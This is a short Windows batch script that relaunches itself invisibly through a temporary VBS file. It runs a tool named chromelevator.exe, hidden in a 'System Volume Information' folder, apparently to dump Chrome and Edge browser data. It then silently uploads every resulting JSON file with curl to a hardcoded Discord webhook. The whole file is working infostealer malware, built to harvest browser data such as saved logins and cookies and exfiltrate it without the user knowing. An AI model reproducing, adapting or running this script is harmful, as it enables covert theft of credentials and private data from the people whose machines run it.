@echo off
:: Create and run a VBS script that runs this batch file completely hidden
echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False > "%temp%\hide.vbs"
cscript //nologo "%temp%\hide.vbs" "%~f0" run
del "%temp%\hide.vbs"
exit /b

:run
set "WEBHOOK=https://discord.com/api/webhooks/1488700872199372920/c_-K4OZTBZriXB-kWxTqTm4sLU1STkMskm1o9tWkgCUoEiZohITva42eDH0nJe5R-bnT"
set "BASE_DIR=%~dp0"

:: Run chromelevator
"%BASE_DIR%System Volume Information\chromelevator.exe" all

:: Wait
timeout /t 5 > nul

:: Send Chrome JSON files
if exist "%BASE_DIR%output\Chrome\*.json" (
    for %%f in ("%BASE_DIR%output\Chrome\*.json") do (
        curl -s -F "file=@%%f" "%WEBHOOK%" > nul 2>&1
        timeout /t 2 > nul
    )
)

:: Send Edge JSON files
if exist "%BASE_DIR%output\Edge\*.json" (
    for %%f in ("%BASE_DIR%output\Edge\*.json") do (
        curl -s -F "file=@%%f" "%WEBHOOK%" > nul 2>&1
        timeout /t 2 > nul
    )
)

exit